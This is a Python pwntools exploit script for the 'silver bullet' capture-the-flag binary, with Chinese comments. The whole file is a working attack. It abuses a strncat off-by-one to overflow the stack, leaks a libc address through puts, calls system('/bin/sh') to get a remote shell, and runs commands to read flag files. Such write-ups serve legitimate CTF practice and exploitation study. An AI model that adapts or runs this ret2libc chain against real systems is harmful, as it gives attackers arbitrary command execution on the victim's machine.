from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./pwnable_silverbullet"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

# ---- 二进制内固定地址（No PIE） -------------------------------------------
READ_PLT = 0x8048490
PUTS_PLT = 0x80484A8
READ_GOT = 0x804AFD0
MAIN = 0x8048954
POP3 = 0x8048A79          # pop esi; pop edi; pop ebp; ret

# ---- 堆栈布局（main 的栈帧） ---------------------------------------------
# struct bullet { char desc[0x30]; unsigned power; } @ ebp-0x34
#   desc  = ebp-0x34 .. ebp-0x5
#   power = ebp-0x4
# 溢出起点 = desc + strlen(desc) = desc + 0x30 = ebp-0x4
DESC_SIZE = 0x30
CHUNK = 0x2F              # 第二轮 power_up 能越界写出 0x2f 字节
# 溢出起点 = desc + strlen(desc) = desc + 0x31 = ebp-0x3：
# 前 3 字节灌进 power 的高 3 位，让 power 变成 0xffffff30 > HP(0x7fffffff)

MENU = b"Your choice :"
DESC_PROMPT = b"Give me your description of bullet :"
UP_PROMPT = b"Give me your another description of bullet :"


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 19_pwnable_silverbullet_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        libpath = os.getenv("I386_LIBPATH")
        if not libpath:
            # 32 位 libc 位置随 deb 不同：libc6:i386 -> usr/lib/i386-linux-gnu，
            # libc6-i386 -> usr/lib32；优先取 I386_LD 同目录
            ld = os.getenv("I386_LD", "")
            libpath = os.path.dirname(ld) if ld else "/usr/lib32"
        path = os.path.join(libpath, "libc.so.6")
    if not path:
        raise SystemExit("[-] set LIBC=/path/to/libc.so.6 for the remote target")
    return ELF(path, checksec=False)


def build_overflow(dwords):
    """ebp-0x3 起 0x2f 字节：3 字节灌进 power 的高 3 位，然后 4 字节对齐的链。

    desc[0x30] 在第一次 power_up 后是 0x01，所以 strlen(desc) = 0x31，
    第二次 strncat 从 desc+0x31 = ebp-0x3 开始写 —— 因此先垫 3 字节。
    整个 payload 里不能出现 \\x00（strncat 以 NUL 结束），这里直接断言。
    """
    body = b"\xff\xff\xff" + b"".join(p32(dw) for dw in dwords)
    body = body.ljust(CHUNK, b"A")
    assert len(body) == CHUNK, "chain too long: %d > %d" % (len(body), CHUNK)
    assert b"\x00" not in body, "chain contains NUL byte -> strncat truncates"
    return body


def prepare(p):
    """create(47 字节 desc) -> power_up(1 字节) 把 power 打回 1。"""
    p.sendlineafter(MENU, b"1")
    p.sendafter(DESC_PROMPT, b"A" * 0x2F + b"\n")   # strlen(desc)=0x2f -> power=0x2f
    p.sendlineafter(MENU, b"2")
    p.sendafter(UP_PROMPT, b"X")                    # 抄 1 字节，NUL 落进 power 低字节
    # 现在 strlen(desc)=0x31 而 power=1 -> 下一次 strncat 从 ebp-0x3 开始写


def fire(p, payload):
    """第二次 power_up 触发越界，然后用 case 3 让 main 正常 return。"""
    p.sendlineafter(MENU, b"2")
    p.sendafter(UP_PROMPT, payload)
    p.sendlineafter(MENU, b"3")                     # beat: hp - power <= 0 -> "Oh ! You win !!"


def attempt(libc):
    p = start()
    prepare(p)

    # ---- round 1: puts(read@got) -> 回到 main ----------------------------
    fire(p, build_overflow([0x01010101, PUTS_PLT, MAIN, READ_GOT]))
    p.recvuntil(b"Oh ! You win !!\n")
    leak = u32(p.recvn(4))
    libc_base = leak - libc.symbols["read"]
    if libc_base & 0xFFF:
        raise RuntimeError(f"read = {leak:#x} -> bad libc base {libc_base:#x}")
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success("read = %#x, libc = %#x, system = %#x" % (leak, libc_base, system))

    # ---- round 2: system("/bin/sh") --------------------------------------
    prepare(p)
    fire(p, build_overflow([0x01010101, system, 0x01010101, binsh]))

    time.sleep(0.3)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )
    return p


def exploit():
    libc = resolve_libc()

    out = ""
    for i in range(5):
        try:
            p = attempt(libc)
            out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
            p.close()
            if "__PWNED__" in out or "flag{" in out:
                break
            log.warning("attempt %d: no shell, retrying" % (i + 1))
        except (RuntimeError, EOFError) as e:
            log.warning("attempt %d failed: %s" % (i + 1, e))
            time.sleep(0.2)

    print(out)
    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    elif "__PWNED__" in out:
        print("[+] __PWNED__ (shell works, no flag file next to the binary)")
    else:
        print("[-] failed, raw output above")


if __name__ == "__main__":
    exploit()
